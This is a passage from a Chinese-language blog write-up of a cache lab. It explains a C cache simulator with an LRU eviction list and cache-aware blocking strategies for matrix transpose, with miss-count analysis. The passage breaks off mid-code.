class="number">0</span>; jj &lt; en; jj += bsize)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">for</span> (j = jj; j &lt; jj + bsize; j++)</span><br><span class="line">                {</span><br><span class="line">                    sum = C[i][j];</span><br><span class="line">                    <span class="keyword">for</span> (k = kk; k &lt; kk + bsize; k++)</span><br><span class="line">                    {</span><br><span class="line">                        sum += A[i][k] * B[k][j];</span><br><span class="line">                    }</span><br><span class="line">                    C[i][j] = sum;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>访问模式如下图所示，每次从 A 选出一条 1*bsize 的行，与 B 中 bsize*bsize 的块进行乘法，叠加在 1*bsize 的 C 切片上。</p>
<p><img src="matrix_multi_blocking.png"></p>
<p>性能结果如下图所示。可以看出，当矩阵大时，分块可以带来显著的收益。而矩阵小时，分块带来的额外运算成本就不能忽略了。</p>
<p><img src="matrix_multi_results.png"></p>
<h2 id="cache-simulator">cache simulator</h2>
<p>本节要求我们模拟任意的<span class="math inline"> \((S,E,B)\)</span> 的 cache 逻辑，并支持命令行传入参数，读入 trace 文件得到 cache
hit、miss、eviction 的结果。分析可以发现，工作分为两部分：</p>
<ul>
<li>支持命令行参数和 trace 文件解析</li>
<li>基于 lru 的 cache</li>
</ul>
<h3 id="命令行参数">命令行参数</h3>
<p>虽然 C 自带的 main 签名 <code>int main(int argc,char
**argv)</code> 就可以用于解析命令行参数，但对于参数传值有些过于简陋了，指导书建议我们使用 <code>getopt</code> 函数，介绍可以详见 <a href="https://www.cnblogs.com/qingergege/p/5914218.html">Linux 下 getopt () 函数的简单使用
- 青儿哥哥 - 博客园 (cnblogs.com)</a>。getopt 函数原型如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getopt</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> * <span class="keyword">const</span> argv[ ],<span class="keyword">const</span> <span class="keyword">char</span> * optstring)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p>前两个参数来自 main 的签名，最后一个是以冒号分割的选项字符串，表示参数的模式，冒号表示必须传参。命令行参数解析代码如下，使用 <code>atoi</code> 函数将字符串转为整型，<code>extern
char *optarg;</code> 是一个保存了参数值的全局变量。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> opt;</span><br><span class="line"><span class="keyword">int</span> s, E, b;</span><br><span class="line"><span class="keyword">char</span> *tracefile;</span><br><span class="line"><span class="keyword">int</span> verbose_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">"hvs:E:b:t:"</span>)) != <span class="number">-1</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">switch</span> (opt)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'h'</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Usage: %s [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">            verbose_flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">            s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">            E = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">            b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">            tracefile = optarg;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: %s [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="trace解析">trace 解析</h3>
<p>这一部分比较简单，读入文件后，根据首字母过滤掉以 <code>I</code> 开头的指令访问，使用 <code>strtoull</code> 函数将字符串转为 <code>unsigned
long
long</code> 的 64 位地址。由于指导书说保证地址对齐，因此可以忽略掉 trace 中的 <code>size</code> 字段，对 trace 每一行，构造如下的 cache 访问对象。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheVisit</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="comment">// 1 L, 2 M, 3 S</span></span><br><span class="line">    <span class="keyword">int</span> op;</span><br><span class="line">} CacheVisit;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="lru-cache">lru cache</h3>
<p>刷 LeetCode 的同学都知道，可以用双向链表 + hash 实现一个 O (1) 的 lru
cache。但在 cache memory 里，这种方法会浪费很多空间，由于一个 Set 里的 cache
line 数量有限，直接暴力查找淘汰性能也不会太差。我这里是只使用了双向链表，按访问时间顺序排列，头部插入，尾部淘汰。也可以使用数组保存，或者 cache
line 保存时间戳等。</p>
<p>为了高内聚低耦合，我设计了单独的 <code>cache.h,
cache.c</code> 来存放相关代码。<code>cache.h</code> 中声明结构体对象和暴露必要的函数。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOAD 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STORE 3</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> tag;</span><br><span class="line">    <span class="keyword">short</span> valid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span> *<span class="title">next</span>;</span></span><br><span class="line">} CacheLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheSet</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">int</span> associativity;</span><br><span class="line">    <span class="keyword">int</span> blockSize;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    CacheLine *head;</span><br><span class="line">    CacheLine *tail;</span><br><span class="line">} CacheSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheResult</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">int</span> miss;</span><br><span class="line">    <span class="keyword">int</span> hit;</span><br><span class="line">    <span class="keyword">int</span> eviction;</span><br><span class="line">} CacheResult;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheVisit</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="comment">// 1 L, 2 M, 3 S</span></span><br><span class="line">    <span class="keyword">int</span> op;</span><br><span class="line">} CacheVisit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Cache</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    CacheSet **sets;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">} Cache;</span><br><span class="line"></span><br><span class="line"><span class="function">Cache *<span class="title">newCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function">CacheResult <span class="title">fetch</span><span class="params">(Cache *cache, CacheVisit *visit)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p>这里我们并不关心 cache 存放的数据，因此 <code>CacheResult</code> 中只需要存储 miss、hit 和 eviction 的数量即可。cache 模块只需要向外暴露构造方法和访问方法即可，遵循最小原则。</p>
<p>在 <code>cache.c</code> 中，实现这些函数的功能，代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cache.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parseAddress</span><span class="params">(Cache *cache, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *tag, <span class="keyword">int</span> *setIdx)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertToHead</span><span class="params">(CacheSet *<span class="built_in">set</span>, CacheLine *node)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evictLRU</span><span class="params">(CacheSet *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlinkLine</span><span class="params">(CacheLine *node)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">CacheSet *<span class="title">newCacheSet</span><span class="params">(<span class="keyword">int</span> blockSize, <span class="keyword">int</span> E)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    CacheSet *<span class="built_in">set</span> = (CacheSet *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheSet));</span><br><span class="line">    <span class="built_in">set</span>-&gt;blockSize = blockSize;</span><br><span class="line">    <span class="built_in">set</span>-&gt;associativity = E;</span><br><span class="line">    <span class="built_in">set</span>-&gt;head = (CacheLine *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line">    <span class="built_in">set</span>-&gt;tail = (CacheLine *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line">    <span class="built_in">set</span>-&gt;head-&gt;next = <span class="built_in">set</span>-&gt;tail;</span><br><span class="line">    <span class="built_in">set</span>-&gt;tail-&gt;prev = <span class="built_in">set</span>-&gt;head;</span><br><span class="line">    <span class="built_in">set</span>-&gt;size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">set</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">Cache *<span class="title">newCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">size_t</span> capacity = (<span class="keyword">size_t</span>)<span class="built_in">pow</span>(<span class="number">2</span>, s);</span><br><span class="line">    Cache *cache = (Cache *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Cache));</span><br><span class="line">    CacheSet **sets = (CacheSet **)<span class="built_in">malloc</span>(capacity * <span class="keyword">sizeof</span>(CacheSet *));</span><br><span class="line">    <span class="keyword">int</span> blockSize = (<span class="keyword">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; capacity; i++)</span><br><span class="line">    {</span><br><span class="line">        sets[i] = newCacheSet(blockSize, E);</span><br><span class="line">    }</span><br><span class="line">    cache-&gt;sets = sets;</span><br><span class="line">    cache-&gt;b = b;</span><br><span class="line">    cache-&gt;s = s;</span><br><span class="line">    cache-&gt;t = <span class="number">64</span> - b - s;</span><br><span class="line">    <span class="keyword">return</span> cache;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">CacheLine *<span class="title">find</span><span class="params">(CacheLine *head, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">for</span> (CacheLine *p = head; p != <span class="literal">NULL</span>; p = p-&gt;next)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;tag == tag &amp;&amp; p-&gt;valid)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">CacheResult <span class="title">fetch</span><span class="params">(Cache *cache, CacheVisit *visit)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag;</span><br><span class="line">    <span class="keyword">int</span> setIdx;</span><br><span class="line">    parseAddress(cache, visit-&gt;address, &amp;tag, &amp;setIdx);</span><br><span class="line">    <span class="comment">// printf("%lld, %d, %llx\n", visit-&gt;address, setIdx, tag);</span></span><br><span class="line">    CacheSet *<span class="built_in">set</span> = cache-&gt;sets[setIdx];</span><br><span class="line">    <span class="comment">// fetch from set</span></span><br><span class="line">    CacheLine *line = find(<span class="built_in">set</span>-&gt;head, tag);</span><br><span class="line">    CacheResult result = {<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>};</span><br><span class="line">    <span class="keyword">if</span> (line != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        result.hit += <span class="number">1</span> + (visit-&gt;op == MODIFY);</span><br><span class="line">        unlinkLine(line);</span><br><span class="line">        insertToHead(<span class="built_in">set</span>, line);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">set</span>-&gt;associativity == <span class="built_in">set</span>-&gt;size)</span><br><span class="line">    {</span><br><span class="line">        evictLRU(<span class="built_in">set</span>);</span><br><span class="line">        result.eviction += <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">set</span>-&gt;size--;</span><br><span class="line">    }</span><br><span class="line">    result.miss += <span class="number">1</span>;</span><br><span class="line">    result.hit += visit-&gt;op == MODIFY;</span><br><span class="line">    line = (CacheLine *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line">    line-&gt;tag = tag;</span><br><span class="line">    line-&gt;valid = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">set</span>-&gt;size++;</span><br><span class="line">    insertToHead(<span class="built_in">set</span>, line);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parseAddress</span><span class="params">(Cache *cache, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *tag, <span class="keyword">int</span> *setIdx)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    address &gt;&gt;= cache-&gt;b;</span><br><span class="line">    *setIdx = (<span class="keyword">int</span>)(address &amp; ((<span class="number">1</span> &lt;&lt; cache-&gt;s) - <span class="number">1</span>));</span><br><span class="line">    *tag = address &gt;&gt; cache-&gt;s;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertToHead</span><span class="params">(CacheSet *<span class="built_in">set</span>, CacheLine *node)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    node-&gt;prev = <span class="built_in">set</span>-&gt;head;</span><br><span class="line">    node-&gt;next = <span class="built_in">set</span>-&gt;head-&gt;next;</span><br><span class="line">    node-&gt;prev-&gt;next = node;</span><br><span class="line">    node-&gt;next-&gt;prev = node;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlinkLine</span><span class="params">(CacheLine *node)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    node-&gt;prev-&gt;next = node-&gt;next;</span><br><span class="line">    node-&gt;next-&gt;prev = node-&gt;prev;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">removeLine</span><span class="params">(CacheLine *node)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    unlinkLine(node);</span><br><span class="line">    <span class="built_in">free</span>(node);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evictLRU</span><span class="params">(CacheSet *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    assert(<span class="built_in">set</span>-&gt;associativity == <span class="built_in">set</span>-&gt;size);</span><br><span class="line">    removeLine(<span class="built_in">set</span>-&gt;tail-&gt;prev);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="trans">trans</h2>
<p>本节要求我们编写矩阵转置的代码，最小化 cache
miss。cache 的设置为直接映射，<span class="math inline">\(S=5,E=1,B=5\)</span>，数组元素是 int 类型，这意味着 cache 每块可以存储 8 个数，一共有 32 块。基础的转置函数如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, j, tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++)</span><br><span class="line">        {</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>由于不同的矩阵形状会导致不同的访问模式，指导书也允许我们针对不同的形状做特殊优化。因此我们可以一个个进行分析。</p>
<h3 id="x32">32x32</h3>
<p>首先打印出 A，B 的地址，分别为 <code>0x10d080,
0x14d080</code>，二者地址的后 10 个 bit 相同，意味着会映射到同一个组，进而发生直接映射下的冲突。接下来，分析 A，B 内部和相互的冲突模式。对于内部的地址<span class="math inline"> \(p\)</span> 与<span class="math inline"> \(p+2^{10}\)</span>，两者有着相同的组索引，进而冲突，差距正好是 32 个块，也就是 32*8/32=8 行。这意味如果访问了第 0 行后再次访问第 8 行，就会出现 cache 淘汰。</p>
<p>而 A，B 之间，由于地址是对齐的，也会出现上述的 cache 淘汰，不同的是，当 A 和 B 访问同一个块时，也会出现淘汰，不仅仅是差 8 行。</p>
<p>接下来，分析基础代码、A 的访问满足步长为 1 的空间局部性，每 8 个元素会导致 1 次
cache
miss，总 miss 数 = 32*32/8=128。B 的访问满足步长为 32 的局部性，每次访问都会 cache
miss，因为过了 8 行之后 cache 就被淘汰了，下次访问又需要重新加载，总 miss 数 = 32*32=1024，加和为 1052。使用 test-trans 测试后发现 miss 数为 1183，大于我们分析的结果。这是由于 A 和 B 之间的 cache 淘汰，影响了命中率。</p>
<p>上面分析得到，只有 A 和 B 访问的<strong>块的列索引相同</strong>，<strong>行索引相差为 8 的整数倍</strong>时，才会出现冲突。又由于 A 和 B 的访问模式是关于对角线对称的，又要列索引相同，不难发现冲突只会发生在对角线上（<strong>对角线元素所在的块</strong>），每行一次，共计 32 次。1052+32=1184，正好多一次。这是由于最后一行的时候，冲突发生在 A 最后一个元素访问结束，B 覆盖掉 A 之后，A 不需要再次访问这个块，冲突是无意义的，需要减去这一次，所以是 1183。</p>
<p>下一步使用分块优化。不难发现 8x8 的块比较合适，因为 cache 块中只能存 8 个元素，而且块的边长大于 8 之后，会引发新的直接映射冲突。可以写出如下的分块代码，其中 <code>height=width=8</code>。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; N; x += height)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; M; y += width)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (i = x; i &lt; x + height; i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span> (j = y; j &lt; y + width; j++)</span><br><span class="line">            {</span><br><span class="line">                tmp = A[i][j];</span><br><span class="line">                B[j][i] = tmp;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>理论分析的话，A 与 B 的每个块都会 miss 8 次，一共有 16 个块，总共是 miss
256 次。还需要考虑相互冲突。以第一个 8*8 的块为例，访问模式为：</p>
<ol type="1">
<li>加载 A [0]：A [0][0]</li>
<li> 加载 B [0]，淘汰 A [0]：B [0][0]</li>
<li><strong> 加载 A [0]，淘汰 B [0]</strong>：A[0][1]</li>
<li> 加载 B [1]-B [7]：B [1][0]-B [7][0]，A [0][2]-A [0][7]</li>
<li> 加载 A [1]，淘汰 B [1]：A [1][0]</li>
<li><strong> 加载 B [0]，淘汰 A [0]</strong>：B[0][1]</li>
<li><strong> 加载 B [1]，淘汰 A [1]</strong>：B[1][1]</li>
<li><strong> 加载 A [1]，淘汰 B [1]</strong>：A[1][2]</li>
<li> 加载 B [2]-B [7]：B [1][1]-B [7][1]，A [1][2]-A [1][7]</li>
<li> 加载 A [2]，淘汰 B [2]：A [2][0]，B [0] 命中</li>
<li><strong>加载 B [1]，淘汰 A [1]</strong>：A[2][1]</li>
<li><strong> 加载 B [2]，淘汰 A [2]</strong>：B[2][2]</li>
<li><strong> 加载 A [2]，淘汰 B [2]</strong>：A[2][3]</li>
<li>...</li>
</ol>
<p>注意其中的加粗部分，是由于相互冲突引发的额外加载。可以发现，一个块内部，除去第一行外，每一行都会引发 3 次额外 miss，因此总 miss 数为 256+4*(1+7*3)=344。使用 test-trans 测试后，结果为 343，同样需要减去最后一次。这与我们的分析是一致的。</p>
<p>接下来问题就是，如何减少这种互相冲突。不难发现，冲突的一大原因在于，访问 A 的对角线行后，会立刻加载 B 的对角线行，使得 A 的缓存失效。后续重新加载 A 又会使得 B 的缓存失效。粗略估计，这会导致 32*2=64
miss。要解决这个问题，可以使用将 A 的一行保存到寄存器里（局部变量中），避免冲突。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; N; x += height)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; M; y += width)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (i = x; i &lt; min(N, x + height); i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">int</span> tmp0 = A[i][y];</span><br><span class="line">            <span class="keyword">int</span> tmp1 = A[i][y + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp2 = A[i][y + <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp3 = A[i][y + <span class="number">3</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp4 = A[i][y + <span class="number">4</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp5 = A[i][y + <span class="number">5</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp6 = A[i][y + <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp7 = A[i][y + <span class="number">7</span>];</span><br><span class="line">            B[y][i] = tmp0;</span><br><span class="line">            B[y + <span class="number">1</span>][i] = tmp1;</span><br><span class="line">            B[y + <span class="number">2</span>][i] = tmp2;</span><br><span class="line">            B[y + <span class="number">3</span>][i] = tmp3;</span><br><span class="line">            B[y + <span class="number">4</span>][i] = tmp4;</span><br><span class="line">            B[y + <span class="number">5</span>][i] = tmp5;</span><br><span class="line">            B[y + <span class="number">6</span>][i] = tmp6;</span><br><span class="line">            B[y + <span class="number">7</span>][i] = tmp7;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>测试后，发现 miss 数为 287，减少了 57 的 miss，与 64 相近，符合我们的估计。</p>
<h3 id="section">64*64</h3>
<p>打印出 A，B 的地址，依然分别为 <code>0x10d080,
0x14d080</code>，相互冲突情况与上面类似。自冲突的话，相差 32*8/64=4 行，因此先尝试 4*4 的情况。</p>
<p>理论上分析，不带局部变量优化的版本，A 每 8 个元素 miss 1 次，B 每 4 个 miss
1 次，64*64/8+64*64/4=1536 次，再考虑相互的冲突，使用 test-trans 实测为 1891，开启局部变量后为 1699。可以发现，4*4 的块浪费了太多 cache，优化上限（不存在冲突）时 miss 数都高于 1300。因此，我们需要更充分地利用 cache 空间。</p>
<p>但是，8*8 的块模式下，B 有严重的冲突问题。不带局部变量版本，A 每 8 个元素 miss
1 次，B 每 1 个 miss
1 次（下面块冲突覆盖掉上面的块），估计 64*64/8+64*64=4068 次，实测 4723，已经与暴力求解相当，没有起到任何的优化效果。那么该怎么做呢？</p>
<p>4*4 分块的一个明显的问题在于块内数据的浪费，以 A 的第一个块为例，读入了 4 行 * 8=32 个 int，只用到了左侧的 4*4 的块，右半部分的数字根本没有用到，就会被 B 覆盖掉。而读入的 B，也只写入了左半部分，右半部分没有写入，又会被 A 的下一个块覆盖。</p>
<p>那么一个直接的想法是，能不能把这些块利用起来，提高吞吐量？我们可以把 8*8 划分为 4*4 的四个块。当读入 A 的前 4 行时：</p>
<ul>
<li>将 A 的左上块对称存放到 B 的左上</li>
<li>将 A 的右上块对称存放到 B 的右上</li>
</ul>
<p>当读入 A 的左下块时：</p>
<ul>
<li>将 A 的左上对称存放到 B 的右上</li>
<li>将 B 的原右上对称存放到 B 的左上</li>
</ul>
<p>读入 A 的右下块时，将其对称存放到 B 的右下。</p>
<p>这样以来，通过 B 的右上进行中转，我们减少了一次 A 的 4*4 块读入，提高了 cache
的利用率。</p>
<p>代码如下。值得注意的是第二个循环中，需要考虑 <strong>A 该以列读还是以行读？</strong>答案是以列读。A 以列读的模式下，B 的左下和右上都是行写入，且冲突只有 B 之间冲突，其余 3 块 cache 均是 A，此时冲突最少。如果 A 以行读，B 的左上和右下都是列写入，互相冲突，B 的每次写入都无法命中缓存，性能极差。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; N; x += <span class="number">8</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; M; y += <span class="number">8</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (i = x; i &lt; x + <span class="number">4</span>; i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">int</span> tmp0 = A[i][y];</span><br><span class="line">            <span class="keyword">int</span> tmp1 = A[i][y + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp2 = A[i][y + <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp3 = A[i][y + <span class="number">3</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp4 = A[i][y + <span class="number">4</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp5 = A[i][y + <span class="number">5</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp6 = A[i][y + <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp7 = A[i][y + <span class="number">7</span>];</span><br><span class="line">            <span class="comment">// A的左上对称到B左上</span></span><br><span class="line">            B[y][i] = tmp0;</span><br><span class="line">            B[y + <span class="number">1</span>][i] = tmp1;</span><br><span class="line">            B[y + <span class="number">2</span>][i] = tmp2;</span><br><span class="line">            B[y + <span class="number">3</span>][i] = tmp3;</span><br><span class="line">            <span class="comment">// A的右上暂存到B右上</span></span><br><span class="line">            B[y][i + <span class="number">4</span>] = tmp4;</span><br><span class="line">            B[y + <span class="number">1</span>][i + <span class="number">4</span>] = tmp5;</span><br><span class="line">            B[y + <span class="number">2</span>][i + <span class="number">4</span>] = tmp6;</span><br><span class="line">            B[y + <span class="number">3</span>][i + <span class="number">4</span>] = tmp7;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = y, 